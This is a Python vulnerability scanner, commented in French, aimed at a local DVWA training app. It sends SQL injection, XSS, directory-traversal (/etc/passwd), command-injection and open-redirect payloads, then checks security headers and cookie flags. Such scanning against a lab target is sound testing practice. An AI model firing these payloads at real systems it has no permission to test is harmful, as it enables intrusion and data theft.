import requests
from urllib.parse import quote

# Configurer la session avec le cookie PHPSESSID et le niveau de sécurité
session = requests.Session()
session.cookies.set('PHPSESSID', 'iblbtktbvtro1tni90cd9cs1p6')  # Remplacez par votre session ID réel
session.cookies.set('security', 'low')  # Assurez-vous que DVWA est sur 'low'

# Variables contenant les URLs des modules de vulnérabilités de DVWA
url_sql_injection = "http://localhost/vulnerabilities/sqli/"
url_xss_reflected = "http://localhost/vulnerabilities/xss_r/"
url_directory_traversal = "http://localhost/vulnerabilities/fi/"
url_command_injection = "http://localhost/vulnerabilities/exec/"
url_file_inclusion = "http://localhost/vulnerabilities/fi/"
url_open_redirect = "http://localhost/vulnerabilities/redirect/"

# Payloads SQL Injection
sql_payloads = [
    "1+OR+1%3D1", "' OR '1'='1", "admin'--", "' OR 1=1--", "' UNION SELECT NULL--"
]

# Payloads XSS
xss_payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
]

# Payloads Directory Traversal
dir_traversal_payloads = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
]

# Payloads Command Injection
command_injection_payloads = [
    "; ls", "& ls /", "| ls", "`ls`"
]

# Payloads File Inclusion
file_inclusion_payloads = [
    "file:///etc/passwd",
    "/var/www/html/dvwa/vulnerabilities/fi/index.php"
]

# Payloads Open Redirect
open_redirect_payloads = [
    "http://example.com",
    "https://evil.com"
]

# Fonction pour scanner l'injection SQL
def scan_sql_injection(session, url):
    print("\n[*] Début du scan SQL Injection...")
    for payload in sql_payloads:
        full_url = f"{url}?id={quote(payload)}"
        response = session.get(full_url)
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            print(f"[+] Vulnérabilité SQL Injection détectée avec le payload : {payload}")
        else:
            print(f"[-] Pas de vulnérabilité SQL Injection détectée avec le payload : {payload}")

# Fonction pour scanner le XSS
def scan_xss(session, url):
    print("\n[*] Début du scan XSS...")
    for payload in xss_payloads:
        full_url = f"{url}?name={quote(payload)}"
        response = session.get(full_url)
        if payload in response.text:
            print(f"[+] Vulnérabilité XSS détectée avec le payload : {payload}")
        else:
            print(f"[-] Pas de vulnérabilité XSS détectée avec le payload : {payload}")

# Fonction pour scanner le Directory Traversal
def scan_directory_traversal(session, url):
    print("\n[*] Début du scan Directory Traversal...")
    for payload in dir_traversal_payloads:
        full_url = f"{url}?page={quote(payload)}"
        response = session.get(full_url)
        if "root:x" in response.text:
            print(f"[+] Vulnérabilité Directory Traversal détectée avec le payload : {payload}")
        else:
            print(f"[-] Pas de vulnérabilité Directory Traversal détectée avec le payload : {payload}")

# Fonction pour scanner le Command Injection
def scan_command_injection(session, url):
    print("\n[*] Début du scan Command Injection...")
    for payload in command_injection_payloads:
        data = {
            'ip': payload,
            'Submit': 'Submit'
        }
        response = session.post(url, data=data, cookies=session.cookies)
        
        if "bin" in response.text or "root" in response.text:
            print(f"[+] Vulnérabilité Command Injection détectée avec le payload : {payload}")
          
        else:
            print(f"[-] Pas de vulnérabilité Command Injection détectée avec le payload : {payload}")

# Fonction pour scanner le File Inclusion
def scan_file_inclusion(session, url):
    print("\n[*] Début du scan File Inclusion...")
    for payload in file_inclusion_payloads:
        full_url = f"{url}?file={quote(payload)}"
        response = session.get(full_url)
        if "root:x" in response.text:
            print(f"[+] Vulnérabilité File Inclusion détectée avec le payload : {payload}")
        else:
            print(f"[-] Pas de vulnérabilité File Inclusion détectée avec le payload : {payload}")

# Fonction pour scanner l'Open Redirect
def scan_open_redirect(session, url):
    print("\n[*] Début du scan Open Redirect...")
    for payload in open_redirect_payloads:
        full_url = f"{url}?url={quote(payload)}"
        response = session.get(full_url, allow_redirects=False)
        if response.status_code in [301, 302] and payload in response.headers.get('Location', ''):
            print(f"[+] Vulnérabilité Open Redirect détectée avec le payload : {payload}")
        else:
            print(f"[-] Pas de vulnérabilité Open Redirect détectée avec le payload : {payload}")

# Fonction pour vérifier les en-têtes de sécurité
def check_security_headers(session, url):
    print("\n[*] Vérification des en-têtes de sécurité...")
    response = session.get(url)
    headers = response.headers
    missing_headers = []

    required_headers = ['X-Content-Type-Options', 'X-Frame-Options', 'Content-Security-Policy', 'Strict-Transport-Security']
    for header in required_headers:
        if header not in headers:
            missing_headers.append(header)

    if missing_headers:
        print(f"[-] En-têtes de sécurité manquants : {', '.join(missing_headers)}")
    else:
        print("[+] Tous les en-têtes de sécurité requis sont présents.")

# Fonction pour scanner la sécurité des cookies
def scan_cookie_security(session, url):
    print("\n[*] Vérification de la sécurité des cookies...")
    response = session.get(url)
    cookies = response.cookies
    for cookie in cookies:
        if not cookie.secure or 'HttpOnly' not in cookie._rest.keys():
            print(f"[-] Cookie potentiellement non sécurisé détecté : {cookie.name}")
        else:
            print(f"[+] Cookie sécurisé détecté : {cookie.name}")

# Appel des fonctions de scan
if __name__ == "__main__":
    scan_sql_injection(session, url_sql_injection)
    scan_xss(session, url_xss_reflected)
    scan_directory_traversal(session, url_directory_traversal)
    scan_command_injection(session, url_command_injection)
    scan_file_inclusion(session, url_file_inclusion)
    scan_open_redirect(session, url_open_redirect)
    check_security_headers(session, "http://localhost")  # URL de la page à vérifier
    scan_cookie_security(session, "http://localhost")  # URL de la page à vérifier
